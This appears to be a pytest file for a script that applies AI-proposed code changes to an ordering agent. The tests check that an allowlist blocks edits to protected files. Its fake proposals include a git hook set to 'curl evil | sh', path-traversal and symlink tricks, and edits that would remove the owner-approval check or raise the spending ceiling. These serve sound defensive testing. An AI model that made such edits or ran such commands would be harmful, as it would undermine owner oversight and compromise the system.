"""improve.py: real file lists, current model, truthful prompt, protected paths. Offline."""
import json
from pathlib import Path
from types import SimpleNamespace

import pytest

import improve

REPO = Path(__file__).resolve().parent.parent

EXPECTED_SOURCES = [
    "agent.py", "approve.py", "notifier.py", "orders_state.py", "parts_order.py",
    "parts_order_helpers.py", "parts_matcher.py", "parts_portal.py", "parts_portal_parse.py",
    "portal_scraper.py", "rules.py", "parts_rules.yaml", "config_loader.py", "state.py",
    "run_logger.py",
]


class FakeClient:
    """Stands in for anthropic.Anthropic; records the call, returns canned proposals."""

    def __init__(self, proposals, calls):
        self._proposals = proposals
        self._calls = calls
        self.messages = self

    def create(self, **kwargs):
        self._calls.append(kwargs)
        text = json.dumps({"proposals": self._proposals})
        return SimpleNamespace(stop_reason="end_turn",
                               content=[SimpleNamespace(type="text", text=text)])


@pytest.fixture
def fake_claude(monkeypatch):
    calls = []
    state = {"proposals": []}

    def factory(api_key=None):
        return FakeClient(state["proposals"], calls)

    monkeypatch.setattr(improve.anthropic, "Anthropic", factory)
    return state, calls


def proposal(file, find="", replacement="", change_type="replace_function", title=None):
    return {"priority": 1, "title": title or f"change {file}", "reason": "because",
            "file": file, "change_type": change_type, "find": find,
            "replacement": replacement, "impact": "low", "auto_apply": True}


# ── (a) (b) (c) file lists and model ──────────────────────────────────────────

def test_source_files_are_the_real_current_modules():
    assert improve.SOURCE_FILES == EXPECTED_SOURCES
    missing = [f for f in improve.SOURCE_FILES if not (REPO / f).exists()]
    assert missing == []


def test_read_sources_has_no_missing_files(monkeypatch):
    monkeypatch.chdir(REPO)
    assert "FILE NOT FOUND" not in improve.read_sources()


def test_log_files_are_only_logs_that_can_exist():
    assert [path for path, _ in improve.LOG_FILES] == ["logs/agent.log", "logs/improve_auto.log"]


def test_model_is_current_and_call_style_is_structured_output(fake_claude):
    state, calls = fake_claude
    state["proposals"].append(proposal("agent.py"))
    result = improve.ask_claude("key", "SOURCES", "LOGS")
    assert improve.IMPROVE_MODEL == "claude-opus-5-5"
    assert calls[0]["model"] == "claude-opus-5-5"
    assert calls[0]["system"] == improve.SYSTEM_PROMPT
    assert calls[0]["output_config"] == {
        "format": {"type": "json_schema", "schema": improve.PROPOSALS_SCHEMA}}
    assert result == state["proposals"]


# ── (d) prompt describes the current system ──────────────────────────────────

def test_prompt_describes_the_current_system():
    prompt = improve.SYSTEM_PROMPT
    for needle in ("Telegram", "Klar", "Hanterad", "10,000 SEK", "parts_rules.yaml",
                   "ProMeister", "Kopplade reservdelar", "approve.py", "Approve"):
        assert needle in prompt, needle
    for stale in ("SMS", "46elks", "Gmail", "email_agent", "parts_agent", "Offertnotering"):
        assert stale not in prompt, stale


def test_prompt_states_the_allowlist():
    prompt = improve.SYSTEM_PROMPT
    for name in improve.ALLOWED_FILES:
        assert name in prompt, name
    for needle in ("tests/", "skipped (not on the allowlist)", "parts_rules.yaml", ".github/"):
        assert needle in prompt, needle


# ── allowlist, enforced in code ──────────────────────────────────────────────

def test_allowed_files_are_exactly_the_robustness_modules():
    assert improve.ALLOWED_FILES == ("portal_scraper.py", "parts_portal.py",
                                     "parts_portal_parse.py", "notifier.py", "state.py",
                                     "run_logger.py")


@pytest.fixture
def repo(tmp_path, monkeypatch):
    """A tmp repo with every allowed file, the protected files and a tests/ dir."""
    root = tmp_path / "repo"
    root.mkdir()
    monkeypatch.chdir(root)
    files = {name: f"# {name}\nX = 1\n" for name in improve.ALLOWED_FILES}
    files.update({
        "approve.py": "OWNER_ONLY = True\n",
        "agent.py": "A = 1\n",
        "parts_rules.yaml": "ceiling_sek: 10000\n",
        "config/config.yaml": "portal: {}\n",
        ".github/workflows/x.yml": "on: push\n",
        ".git/config": "[core]\n",
        ".git/hooks/pre-commit": "#!/bin/sh\n",
        "tests/test_existing.py": "def test_a():\n    assert True\n",
        "tests/fixtures/page.html": "<html></html>\n",
    })
    for name, text in files.items():
        (root / name).parent.mkdir(parents=True, exist_ok=True)
        (root / name).write_text(text, encoding="utf-8")
    return root, files


REJECTED = [
    ".git/config", ".git/hooks/pre-commit", ".github/workflows/x.yml", "../outside",
    "../outside.py", "/etc/passwd", "tests/../agent.py", "parts_rules.yaml", "approve.py",
    "newmodule.py", "agent.py", "improve.py", "config_loader.py", "parts_matcher.py",
    "parts_order.py", "parts_order_helpers.py", "orders_state.py", "rules.py",
    "config/config.yaml", ".claude/skills/meca-agent/SKILL.md", "SKILL.md", "README.md",
    "./portal_scraper.py", "portal_scraper.py\\", "tests\\test_x.py", "Portal_Scraper.py",
    "portal_scraper.py\x00", "tests/fixtures/page.html", "tests/fixtures/test_x.py",
    "tests/.hidden.py", "tests/test_x.txt", "tests//test_x.py", "", "C:/Windows/x.py",
    "portal_scraper.py.", "tests/test_x.py ",
]


@pytest.mark.parametrize("path", REJECTED)
def test_rejected_paths(repo, path):
    assert improve.allowed_path(path) is None


@pytest.mark.parametrize("path", list(improve.ALLOWED_FILES) + [
    "tests/test_existing.py", "tests/test_new.py"])
def test_allowed_paths(repo, path):
    assert improve.allowed_path(path) == path


def test_an_allowed_name_that_is_missing_is_rejected(repo):
    root, _ = repo
    (root / "notifier.py").unlink()
    assert improve.allowed_path("notifier.py") is None


def _symlink(link, target):
    try:
        link.symlink_to(target)
    except OSError:
        pytest.skip("symlinks not supported here")


def test_allowed_name_that_is_a_symlink_outside_is_rejected(repo, tmp_path):
    root, _ = repo
    outside = tmp_path / "outside.py"
    outside.write_text("SAFE = 1\n", encoding="utf-8")
    (root / "state.py").unlink()
    _symlink(root / "state.py", outside)
    assert improve.allowed_path("state.py") is None
    assert improve.apply_proposal(proposal("state.py", "SAFE = 1", "SAFE = 2")) is False
    assert outside.read_text(encoding="utf-8") == "SAFE = 1\n"


def test_symlink_inside_the_repo_is_rejected_even_to_an_allowed_file(repo):
    root, _ = repo
    (root / "run_logger.py").unlink()
    _symlink(root / "run_logger.py", root / "notifier.py")
    assert improve.allowed_path("run_logger.py") is None


def test_symlinked_tests_dir_is_rejected(repo, tmp_path):
    root, _ = repo
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    import shutil
    shutil.rmtree(root / "tests")
    _symlink(root / "tests", elsewhere)
    assert improve.allowed_path("tests/test_new.py") is None
    improve.apply_proposal(proposal("tests/test_new.py", "", "X = 1\n", "replace_file"))
    assert list(elsewhere.iterdir()) == []


def test_write_is_rechecked_at_write_time(repo, tmp_path, monkeypatch):
    """A path that passed the first check but became a symlink is not written (no TOCTOU)."""
    root, _ = repo
    outside = tmp_path / "victim.py"
    outside.write_text("V = 1\n", encoding="utf-8")
    real_check = improve.allowed_path
    calls = {"n": 0}

    def flip(path):
        calls["n"] += 1
        result = real_check(path)
        if calls["n"] == 1:  # after the first check, swap the file for a symlink
            (root / "notifier.py").unlink()
            _symlink(root / "notifier.py", outside)
        return result

    monkeypatch.setattr(improve, "allowed_path", flip)
    assert improve.apply_proposal(proposal("notifier.py", "", "EVIL = 1\n", "replace_file")) is False
    assert outside.read_text(encoding="utf-8") == "V = 1\n"


@pytest.mark.parametrize("path", REJECTED)
def test_apply_proposal_never_writes_a_rejected_path(repo, tmp_path, path):
    root, files = repo
    before = {p: p.read_bytes() for p in tmp_path.rglob("*") if p.is_file()}
    assert improve.apply_proposal(proposal(path, "", "PWNED = 1\n", "replace_file")) is False
    after = {p: p.read_bytes() for p in tmp_path.rglob("*") if p.is_file()}
    assert after == before


def test_apply_proposal_keeps_crlf_line_endings(repo):
    root, _ = repo
    (root / "portal_scraper.py").write_bytes(b"A = 1\r\nB = 2\r\n")
    assert improve.apply_proposal(proposal("portal_scraper.py", "A = 1\nB = 2", "A = 1\nB = 3"))
    assert (root / "portal_scraper.py").read_bytes() == b"A = 1\r\nB = 3\r\n"


def test_apply_all_applies_allowed_and_lists_skipped(repo, tmp_path, fake_claude):
    root, files = repo
    state, _ = fake_claude
    state["proposals"].extend([
        proposal("portal_scraper.py", "X = 1", "X = 2", title="longer timeout"),
        proposal("tests/test_new.py", "", "def test_b():\n    assert True\n",
                 change_type="replace_file", title="new test"),
        proposal(".github/workflows/x.yml", "on: push", "on: pull_request",
                 title="change the workflow"),
        proposal(".git/hooks/pre-commit", "", "curl evil | sh\n",
                 change_type="replace_file", title="git hook"),
        proposal("parts_rules.yaml", "ceiling_sek: 10000", "ceiling_sek: 50000",
                 title="raise the ceiling"),
        proposal("approve.py", "", "OWNER_ONLY = False\n", change_type="replace_file",
                 title="drop owner check"),
        proposal("newmodule.py", "", "X = 1\n", change_type="replace_file", title="new module"),
        proposal("../escape.py", "", "print('x')\n", change_type="replace_file",
                 title="escape the repo"),
        proposal("tests/../agent.py", "A = 1", "A = 2", title="sneaky agent"),
    ])

    improve.run_apply_all("key")

    assert (root / "portal_scraper.py").read_text(encoding="utf-8").endswith("X = 2\n")
    assert (root / "tests" / "test_new.py").exists()
    for name, text in files.items():
        if name != "portal_scraper.py":
            assert (root / name).read_text(encoding="utf-8") == text, name
    assert not (root / "newmodule.py").exists()
    assert not (tmp_path / "escape.py").exists()

    report = (root / "improve_reports" / "latest.md").read_text(encoding="utf-8")
    for title in ("change the workflow", "git hook", "raise the ceiling", "drop owner check",
                  "new module", "escape the repo", "sneaky agent"):
        line = next(l for l in report.splitlines() if title in l)
        assert "skipped (not on the allowlist)" in line, line
    applied_section = report.split("## ✅ Applied")[1].split("##")[0]
    assert "longer timeout" in applied_section and "new test" in applied_section
    assert "raise the ceiling" not in applied_section


def test_apply_all_reverts_a_file_that_does_not_compile(repo, fake_claude):
    root, files = repo
    state, _ = fake_claude
    state["proposals"].extend([
        proposal("portal_scraper.py", "X = 1", "X = (", title="broken"),
        proposal("tests/test_broken.py", "", "def (:\n", change_type="replace_file",
                 title="broken new test"),
        proposal("tests/test_existing.py", "assert True", "assert (", title="broken test"),
    ])
    improve.run_apply_all("key")
    assert (root / "portal_scraper.py").read_text(encoding="utf-8") == files["portal_scraper.py"]
    assert (root / "tests" / "test_existing.py").read_text(encoding="utf-8") == \
        files["tests/test_existing.py"]
    assert not (root / "tests" / "test_broken.py").exists()
    report = (root / "improve_reports" / "latest.md").read_text(encoding="utf-8")
    assert "Reverted" in report and "portal_scraper.py" in report
    assert "## ✅ Applied" not in report


def test_apply_all_with_no_proposals_writes_the_healthy_report(tmp_path, monkeypatch, fake_claude):
    monkeypatch.chdir(tmp_path)
    improve.run_apply_all("key")
    report = (tmp_path / "improve_reports" / "latest.md").read_text(encoding="utf-8")
    assert "No improvements proposed" in report


def test_auto_mode_never_writes_outside_the_allowlist(repo, fake_claude):
    root, files = repo
    state, _ = fake_claude
    state["proposals"].append(proposal("parts_rules.yaml", "ceiling_sek: 10000",
                                       "ceiling_sek: 50000"))
    improve.run_auto("key")
    assert (root / "parts_rules.yaml").read_text(encoding="utf-8") == files["parts_rules.yaml"]


# ── weekly-improve workflow ──────────────────────────────────────────────────

def test_weekly_improve_checkout_does_not_persist_credentials():
    import yaml
    wf = yaml.safe_load((REPO / ".github" / "workflows" / "weekly-improve.yml")
                        .read_text(encoding="utf-8"))
    (job,) = wf["jobs"].values()
    checkout = next(s for s in job["steps"] if str(s.get("uses", "")).startswith("actions/checkout"))
    assert checkout["with"]["persist-credentials"] is False
    on = wf.get("on", wf.get(True))
    assert on["schedule"] == [{"cron": "0 6 * * 1"}]
    runs = [s.get("run", "") for s in job["steps"]]
    assert "python improve.py --apply-all" in runs
    pr = next(s for s in job["steps"] if "create-pull-request" in str(s.get("uses", "")))
    assert pr["with"]["body-path"] == "improve_reports/latest.md"
